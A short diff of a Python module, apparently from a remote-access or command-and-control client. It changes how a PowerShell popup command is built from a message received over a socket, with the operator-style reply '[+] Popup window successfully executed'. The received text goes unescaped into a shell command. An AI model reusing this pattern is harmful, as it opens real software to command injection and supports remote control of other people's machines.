@@ -5,7 +5,8 @@ import ctypes
 
 if win_client():
     message=receive(client_socket)
-    cmd = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message)
+    cmd = f'powershell "(new-object -ComObject wscript.shell).Popup(\\"{message}\\",0,\\"Windows\\")"'
+
     start_command(cmd)
     resp = "[+] Popup window successfully executed\n"
     send(client_socket,resp)
